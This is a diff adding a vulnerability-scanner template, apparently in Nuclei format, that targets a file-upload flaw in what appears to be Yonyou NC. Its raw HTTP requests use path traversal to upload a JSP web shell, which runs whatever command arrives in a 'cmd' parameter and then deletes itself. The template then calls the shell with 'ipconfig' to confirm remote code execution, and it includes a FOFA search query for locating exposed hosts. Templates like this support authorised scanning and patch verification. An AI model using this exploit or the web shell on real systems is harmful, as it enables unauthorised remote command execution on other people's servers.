@@ -1,0 +1,46 @@
+id: YYNC-uploadControl-uploadFile
+info:
+  name: YYNC-uploadControl-uploadFile
+  author: lengmo
+  severity: critical
+  description: YYNC-uploadControl-uploadFile
+  tags: Upload,rce
+  metadata:
+    fofa-query: icon_hash="1085941792"
+ 
+http:
+  - raw:
+      - |
+        POST /mp/initcfg/../uploadControl/uploadFile HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryHHaZAYecVOf5sfa6
+
+
+        ------WebKitFormBoundaryHHaZAYecVOf5sfa6
+        Content-Disposition: form-data; name="file"; filename="test.jsp"
+        Content-Type: image/jpeg
+        
+        <% java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();int a = -1;byte[] b = new byte[2048];out.print("<pre>");while((a=in.read(b))!=-1){out.println(new String(b,0,a));}out.print("</pre>");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+        ------WebKitFormBoundaryHHaZAYecVOf5sfa6
+        Content-Disposition: form-data; name="submit"
+
+        上传
+        ------WebKitFormBoundaryHHaZAYecVOf5sfa6--
+
+      
+      - |
+        GET /mp/uploadFileDir/test.jsp?cmd=ipconfig HTTP/1.1
+        Host: {{Hostname}}
+
+      
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'Windows IP'
+          - 'eth0'
+      - type: status
+        status: 
+          - 200
